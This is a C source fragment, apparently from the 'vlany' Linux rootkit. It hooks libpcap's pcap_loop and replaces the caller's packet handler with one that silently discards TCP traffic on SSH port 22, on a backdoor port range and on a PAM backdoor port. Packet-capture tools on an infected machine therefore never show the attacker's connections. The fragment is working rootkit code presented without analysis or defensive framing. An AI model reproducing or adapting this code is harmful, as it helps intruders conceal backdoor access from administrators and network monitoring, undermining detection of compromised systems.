void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    #ifdef DEBUG
        printf("[vlany] got_packet() called\n");
    #endif

    const struct sniff_ip *ip;
    const struct sniff_tcp *tcp;
    int size_ip, size_tcp, sport, dport;

    ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;

    if(size_ip < 20) return;

    switch(ip->ip_p)
    {
        case IPPROTO_TCP:
            break;
        default:
            if(old_callback) old_callback(args, header, packet);
            return;
    }

    tcp = (struct sniff_tcp *)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    if(size_tcp < 20) return;

    sport = htons(tcp->th_sport);
    dport = htons(tcp->th_dport);

    if((sport == 22 || dport == 22) || (sport >= LOW_PORT && sport <= HIGH_PORT) || (dport >= LOW_PORT && dport <= HIGH_PORT) || (sport == PAM_PORT || dport == PAM_PORT)) return;
    else if(old_callback) old_callback(args, header, packet);
}

int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
{
    #ifdef DEBUG
        printf("[vlany] pcap_loop() called\n");
    #endif

    old_callback = callback;
    HOOK(old_pcap_loop, CPCAP_LOOP);
    return old_pcap_loop(p, cnt, got_packet, user);
}
